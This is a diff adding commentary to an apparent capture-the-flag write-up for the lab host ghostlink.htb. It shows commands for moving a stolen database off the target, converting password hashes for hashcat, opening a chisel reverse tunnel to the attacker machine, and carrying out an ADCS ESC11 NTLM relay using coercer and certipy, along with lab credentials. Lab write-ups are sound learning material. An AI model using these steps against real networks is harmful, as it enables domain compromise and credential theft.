@@ -923,6 +923,8 @@ git@gpz-op26-toolkits:~/data/tmp/local-repo/10$
 
 ```
 
+enumeration reveals a db which is transfered to the kali host over a raw tcp sock as the common networking tools are not installed on the host
+
 ```
 git@gpz-op26-toolkits:~/data$ ls /opt/gogs/data
 ls /opt/gogs/data
@@ -980,6 +982,8 @@ sqlite> SELECT id, name, email, passwd, salt, is_admin FROM user;
 ╰──┴───────────────┴──────────────────────┴────────────────────────────────────────────────┴──────────┴────────
 ```
 
+converting the string into hashcat crackable format:
+
 ```
 python3 GogsToHashcat.py -n 10000 -o nvirelli.hash QRIHYJqJdcDW3YdxPy25 8d9b3a01c3a0260b39db011aed1dbf239b8b1b28af6141f28aa01d3b3ab8ffd4408bc5b9065ff957e716375a7bec1755d3e8
 sha256:10000:UVJJSFlKcUpkY0RXM1lkeFB5MjU=:jZs6AcOgJgs52wEa7R2/I5uLGyivYUHyiqAdOzq4/9RAi8W5Bl/5V+cWN1p77BdV0+g=
@@ -1017,7 +1021,7 @@ cat user.txt
 ---
 ## Privilege Escalation
 
-### Enumeration
+### shares and users Enumeration
 
 ```
 nxc smb ghostlink.htb -u nvirelli -p 'u47YUclrDiwWxBheaSzI' --users
@@ -1054,6 +1058,9 @@ SMB         10.129.191.32   445    DC01             SYSVOL          READ        
 
 tried bloodhound enum but nothiing useful 
 
+
+setting a reverse tunnel to forward the traffic from the internal network to the kali machine
+
 ```
 ./chisel server -v -p 1234 --reverse --socks5
 2026/10/31 16:39:05 server: Reverse tunnelling enabled
@@ -1081,7 +1088,9 @@ git@gpz-op26-toolkits:/tmp$ ./chisel client -v 10.10.14.148:1234 R:socks
 
 ```
 
-esc11
+## ADCS exploitation
+
+enumerating for vulberable certificates reveals a ESC11 attack path: (explain briefly)
 
 ```
  proxychains certipy-ad find -u nvirelli@ghostlink.htb -p u47YUclrDiwWxBheaSzI -dc-ip 10.129.191.32 -dc-host dc01.ghostlink.htb -vulnerable -stdout
@@ -1152,12 +1161,14 @@ installed with uv to avoid an error
 uv tool install impacket --force --with 'pyOpenSSL<25'
 ```
 
+setting the relay:
 
 ```shell
 sudo proxychains ~/.local/bin/ntlmrelayx.py -t rpc://172.16.20.10 -rpc-mode ICPR -icpr-ca-name 'ghostlink-GPZ-OP26-SECURE-CA' -smb2support --template DomainController
 
 ```
 
+forcing authentication to get back a certificate as the dc01 machine account ( i guess)
 ```
 coercer coerce -l 10.10.14.148 -t dc01.ghostlink.htb -d ghostlink.htb -u nvirelli -p u47YUclrDiwWxBheaSzI --always-continue
        ______
@@ -1212,6 +1223,7 @@ coercer coerce -l 10.10.14.148 -t dc01.ghostlink.htb -d ghostlink.htb -u nvirell
 
 ```
 
+impe
 ```
 certipy-ad auth -pfx DC01.pfx -dc-ip 10.129.191.32
 Certipy v5.1.0 - by Oliver Lyak (ly4k)
